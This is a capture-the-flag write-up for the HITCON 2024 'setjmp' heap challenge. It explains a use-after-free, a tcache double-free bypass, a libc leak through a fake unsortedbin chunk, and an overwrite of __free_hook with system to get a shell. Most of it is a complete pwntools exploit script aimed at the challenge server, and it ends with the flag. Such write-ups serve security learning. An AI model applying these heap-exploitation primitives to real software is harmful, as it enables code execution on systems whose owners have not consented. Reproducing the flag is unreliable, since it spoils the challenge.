# HITCON 2024 - setjmp

**Summary**: Use a UAF and double free in the tcache bin to get arbitrary read/write. Then, free a fake large chunk on the heap and send it into the unsortedbin to get libc leaks. Overwrite the `__free_hook` to get RCE.

## Reversing

The program lets us allocate, free, edit (we can only edit the password, which is the 2nd qword in the chunk), and view `User` structs, and then it also has `setjmp`/`longjmp` calls in order to restart the state. The struct used to represent a user is:

```C
struct User {
	char username[8];
	char password[8];
	struct User *prev;
	struct User *next;
};
```

So as it can be seen, all users are kept in a double-linked list (which is also circular, as it appears from other functions operating on this list). When the program starts, it allocates a single user on the heap with username and password "root" and then goes into the menu loop.

## Exploitation

First, by having a user with an 8-character password, we can get a heap leak.
Also, if we free the user at the head of the linked list (a pointer to which is kept in the menu loop in `main()`), the pointer to it in `main()` won't be invalidated. So, we can have UAF. We can edit it, and also free it again if we want. By writing a junk value into the `password` field (which is the `key` field of the freed tcache chunk), we can bypass tcache double-free protection. Then, we can free this chunk again and perform tcache-dup to get an arbitrary value into tcache head and allocate it. So, we can have arbitrary read/write. Also, we can free the returned chunk (that is allocated at an arbitrary address) to get an arbitrary free primitive. Additionally, we can choose the `restart` option in the menu after these every time to reset the linked list state and be able to reuse our primitivies. From here, we just need to write fake metadata for a large chunk on the heap (using our arbitrary write) and use arbitrary free to free that chunk. This will get two libc pointers on the heap, and we can use the arbitrary read to read them. Then, we can write the address of `system` into `__free_hook` and free a user with username `"/bin/sh"` to get RCE.

Full exploit:

```python
from pwn import *

context.update(os="linux", arch="amd64")
elf = context.binary = ELF("run")
libc = ELF("libc.so.6")

if args.REMOTE:
	p = remote("setjmp.chal.hitconctf.com", 1337)
else:
	p = elf.process()
	if args.GDB:
		gdb.attach(p)
		pause()

def restart():
	p.sendlineafter(b"> ", b"1")

def new_user(username, password):
	p.sendlineafter(b"> ", b"2")
	p.sendafter(b"> ", username)
	p.sendafter(b"> ", password)

def del_user(username):
	p.sendlineafter(b"> ", b"3")
	p.sendafter(b"> ", username)

def change_pass(username, password):
	p.sendlineafter(b"> ", b"4")
	p.sendafter(b"> ", username)
	p.sendafter(b"> ", password)

def view_users():
	p.sendlineafter(b"> ", b"5")

new_user(b"A\n", b"a" * 8)
view_users()
p.recvuntil(b"A: aaaaaaaa")
heap_leak = u64(p.recvuntil(b"root", drop=True)[:-1].ljust(8, b"\0"))
heap_base = heap_leak - 0x370
log.success("heap base = " + hex(heap_base))

def arb_write(where, what1, what2):
	restart()
	new_user(b"A\n", b"a" * 8)
	view_users()
	p.recvuntil(b"A: aaaaaaaa")
	heap_leak = u64(p.recvuntil(b"root", drop=True)[:-1].ljust(8, b"\0"))
	del_user(b"root\n")
	del_user(b"A\n")
	uaf_user = p64(heap_leak).rstrip(b"\0") + b"\n"
	change_pass(uaf_user, b"junk")
	del_user(uaf_user)
	new_user(p64(where), b"CCCC\n")
	new_user(b"DDDD\n", b"EEEE\n")
	new_user(p64(what1), p64(what2))

def arb_read(where, lsb):
	restart()
	new_user(b"A\n", b"a" * 8)
	view_users()
	p.recvuntil(b"A: aaaaaaaa")
	heap_leak = u64(p.recvuntil(b"root", drop=True)[:-1].ljust(8, b"\0"))
	del_user(b"root\n")
	del_user(b"A\n")
	uaf_user = p64(heap_leak).rstrip(b"\0") + b"\n"
	change_pass(uaf_user, b"junk")
	del_user(uaf_user)
	new_user(p64(where), b"CCCC\n")
	new_user(b"DDDD\n", b"EEEE\n")
	new_user(lsb, lsb)
	view_users()
	p.recvuntil(lsb)
	leak = p.recvuntil(b": ", drop=True).ljust(7, b"\0")
	leak = b"\0" + leak
	return u64(leak)

def arb_free(where):
	restart()
	new_user(b"A\n", b"a" * 8)
	view_users()
	p.recvuntil(b"A: aaaaaaaa")
	heap_leak = u64(p.recvuntil(b"root", drop=True)[:-1].ljust(8, b"\0"))
	del_user(b"root\n")
	del_user(b"A\n")
	uaf_user = p64(heap_leak).rstrip(b"\0") + b"\n"
	change_pass(uaf_user, b"junk")
	del_user(uaf_user)
	new_user(p64(where), b"CCCC\n")
	new_user(b"DDDD\n", b"EEEE\n")
	new_user(b"SSSS\n", b"SSSS\n")
	del_user(b"SSSS\n")

fake_chunk = heap_base + 0x5008
arb_write(fake_chunk, 0x501, 0)
arb_write(fake_chunk + 0x500, 0x21, 0)
arb_write(fake_chunk + 0x500 + 0x20, 0x21, 0)
arb_free(fake_chunk + 8)

libc_leak = arb_read(heap_base + 0x5218, b"\xe0")
libc.address = libc_leak - 0x1ecb00
log.success("libc base = " + hex(libc.address))

arb_write(libc.sym["__free_hook"], libc.sym["system"], 0)
restart()
new_user(b"/bin/sh\0", b"a\n")
del_user(b"/bin/sh\0")

p.interactive()
```

And the flag: `hitcon{fr0m-H3ap-jum9-2-system}`
